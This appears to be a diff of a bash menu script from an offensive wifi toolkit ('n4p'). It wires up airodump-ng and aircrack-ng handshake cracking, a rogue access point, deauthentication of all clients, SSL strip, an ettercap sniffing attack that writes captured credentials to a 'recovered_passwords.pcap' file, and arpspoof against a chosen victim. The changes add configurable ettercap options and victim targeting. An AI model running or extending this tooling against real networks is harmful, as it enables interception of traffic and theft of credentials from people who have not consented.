@@ -2,7 +2,7 @@
 if [[ $(id -u) != 0 ]]; then # Verify we are not root
 	xhost +
 else
-   echo "This script can not be ran as root or with sudo. If you are root than run n4p_main.sh directly" 1>&2
+   echo "This script can not be ran as root or with sudo." 1>&2
    exit 1
 fi
 
@@ -32,10 +32,10 @@ AP_GATEWAY=$(grep routers /etc/n4p/dhcpd.conf | awk -Frouters '{print $2}' | cut
 get_name "IFACE1="; IFACE1=$USE
 MON="${IFACE1}mon"
 
-echo "${BLD_TEA}$(cat /usr/share/n4p/opening.logo)${TXT_RST}"; sleep 1.5
+echo "${BLD_TEA}$(cat /usr/share/n4p/opening.logo)${TXT_RST}"; sleep 1
 
 sessionfolder=/tmp/n4p # Set our tmp working configuration directory and then build config files
-if [ ! -d "$sessionfolder" ]; then mkdir "$sessionfolder"; fi
+[ ! -d "$sessionfolder" ] && mkdir "$sessionfolder"; mkdir -p "$sessionfolder" "$sessionfolder/logs"
 
 menu()
 {
@@ -48,9 +48,9 @@ menu()
     | ${TXT_RST}${BLD_TEA}1${TXT_RST}${BLD_WHT})  Perform wifi radious recon                      |
     | ${TXT_RST}${BLD_TEA}2${TXT_RST}${BLD_WHT})  Set devices for use and attack                  |
     | ${TXT_RST}${BLD_TEA}3${TXT_RST}${BLD_WHT})  Airodump-ng target for .cap capture crack       |
-    | ${TXT_RST}${BLD_TEA}4${TXT_RST}${BLD_WHT})  Aircrack-ng the new captured pcap               |
+    | ${TXT_RST}${BLD_TEA}4${TXT_RST}${BLD_WHT})  Aircrack-ng the new captured .cap               |
     | ${TXT_RST}${BLD_TEA}5${TXT_RST}${BLD_WHT})  Launch Access Point                             |
-    | ${TXT_RST}${BLD_TEA}6${TXT_RST}${BLD_WHT})  Enumerate the Firewall ${TXT_RST}${BLD_TEA}(Required after option 4)${TXT_RST}${BLD_WHT}|
+    | ${TXT_RST}${BLD_TEA}6${TXT_RST}${BLD_WHT})  Enumerate the Firewall ${TXT_RST}${BLD_TEA}(Run this option last)${TXT_RST}${BLD_WHT}   |
     | ${TXT_RST}${BLD_TEA}7${TXT_RST}${BLD_WHT})  Kick everyone                                   |
     | ${TXT_RST}${BLD_TEA}8${TXT_RST}${BLD_WHT})  Start SSL Strip                                 |
     | ${TXT_RST}${BLD_TEA}9${TXT_RST}${BLD_WHT})  Start Ettercap Sniff Attack                     |
@@ -90,20 +90,18 @@ menu()
         get_name "AP="; AP_NAME=$USE
         get_name "BRIDGED="; BRIDGED=$USE
         [[ ! -f $sessionfolder/recovered_passwords.pcap ]] && sudo touch $sessionfolder/recovered_passwords.pcap
+        get_name "ETTERCAP_OPTIONS="; ETTERCAP_OPTIONS=$USE
         if [[ $BRIDGED == "True" ]]; then
-    	   sudo xterm -T "ettercap $BR_NAME" -geometry 90x20 -e ettercap -Tq -i $BR_NAME -w $sessionfolder/recovered_passwords.pcap &>/dev/null &
+    	   sudo xterm -T "ettercap $BR_NAME" -geometry 90x20 -e ettercap $ETTERCAP_OPTIONS -i $BR_NAME -w $sessionfolder/recovered_passwords.pcap &>/dev/null &
         elif [[ $AP_NAME == "AIRBASE" ]]; then
-           sudo xterm -T "ettercap at0" -geometry 90x20 -e ettercap -Tq -i at0 -w $sessionfolder/recovered_passwords.pcap &>/dev/null &
+           sudo xterm -T "ettercap at0" -geometry 90x20 -e ettercap $ETTERCAP_OPTIONS -i at0 -w $sessionfolder/recovered_passwords.pcap &>/dev/null &
         elif [[ $AP_NAME == "HOSTAPD" ]]; then
-           sudo xterm -T "ettercap $IFACE1" -geometry 90x20 -e ettercap -Tq -i $IFACE1 -w $sessionfolder/recovered_passwords.pcap &>/dev/null &
+           sudo xterm -T "ettercap $IFACE1" -geometry 90x20 -e ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w $sessionfolder/recovered_passwords.pcap &>/dev/null &
         fi
     elif [[ $choice == 10 ]]; then
         get_name "IFACE1="; IFACE1=$USE
-        if [[ $AP_NAME == "AIRBASE" ]]; then
-    	    sudo xterm -T "Arpspoof at0 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i at0 $AP_GATEWAY &>/dev/null &
-        elif [[ $AP_NAME == "HOSTAPD" ]]; then
-            sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $AP_GATEWAY &>/dev/null &
-        fi
+        get_name "ARP_VICTIM="; ARP_VICTIM=$USE
+        sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
     else
     	echo "Invald Option"
     	menu
